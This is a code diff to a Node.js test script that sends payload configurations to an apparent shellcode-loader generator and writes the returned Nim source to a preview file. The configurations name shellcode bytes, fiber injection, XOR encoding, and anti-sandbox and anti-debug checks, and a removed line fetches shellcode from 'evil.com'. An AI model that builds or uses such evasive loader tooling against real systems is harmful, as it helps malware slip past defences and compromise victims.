@@ -1,4 +1,5 @@
 const http = require('http');
+const fs = require('fs');
 
 const scenarios = [
     {
@@ -6,22 +7,28 @@ const scenarios = [
         payload: {
             name: "RawTest",
             output: "exe",
-            shellcode: "0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60",
+            shellcode: "0xfc,0x48,0x83",
             injection_method: "fiber",
             syscall_evasion: "none"
         }
     },
     {
-        label: "HTTP SHELLCODE",
+        label: "FULL EVASION + XOR",
         payload: {
-            name: "HttpTest",
+            name: "HackerMode",
             output: "exe",
-            shellcode_url: "https://evil.com/shellcode.bin",
+            shellcode: "0x12,0x34,0x56",
+            xor_key: "0xAA,0xBB",
             injection_method: "fiber",
-            syscall_evasion: "none"
+            syscall_evasion: "none",
+            anti_sandbox: ["cpu_ram", "timing", "human_behavior"],
+            anti_debug: ["is_debugger_present"]
         }
     }
 ];
+
+let output = "";
+let completed = 0;
 
 function sendRequest(scenario) {
     const data = JSON.stringify(scenario.payload);
@@ -36,7 +43,7 @@ function sendRequest(scenario) {
         }
     };
 
-    console.log(`\n=== SCENARIO: ${scenario.label} ===`);
+    output += `\n\n=== SCENARIO: ${scenario.label} ===\n`;
     const req = http.request(options, (res) => {
         let body = '';
         res.on('data', chunk => body += chunk);
@@ -44,20 +51,35 @@ function sendRequest(scenario) {
             try {
                 const json = JSON.parse(body);
                 if (json.source_code) {
-                    console.log("--- GENERATED NIM SOURCE ---");
-                    console.log(json.source_code);
-                    console.log("----------------------------");
+                    output += json.source_code + "\n";
                 } else {
-                    console.log("RESPONSE:", JSON.stringify(json, null, 2));
+                    output += "ERROR: " + JSON.stringify(json, null, 2) + "\n";
                 }
             } catch (e) {
-                console.log("Raw body:", body);
+                output += "PARSE ERROR: " + body + "\n";
+            }
+            
+            completed++;
+            if (completed === scenarios.length) {
+                fs.writeFileSync('nim_preview.txt', output, 'utf8');
+                console.log("✓ Preview written to nim_preview.txt");
+                process.exit(0);
             }
         });
+    });
+    
+    req.on('error', (e) => {
+        output += `REQUEST ERROR: ${e.message}\n`;
+        completed++;
+        if (completed === scenarios.length) {
+            fs.writeFileSync('nim_preview.txt', output, 'utf8');
+            console.log("✓ Preview written to nim_preview.txt (with errors)");
+            process.exit(1);
+        }
     });
     
     req.write(data);
     req.end();
 }
 
-scenarios.forEach((s, i) => setTimeout(() => sendRequest(s), i * 2000));
+scenarios.forEach((s, i) => setTimeout(() => sendRequest(s), i * 1000));
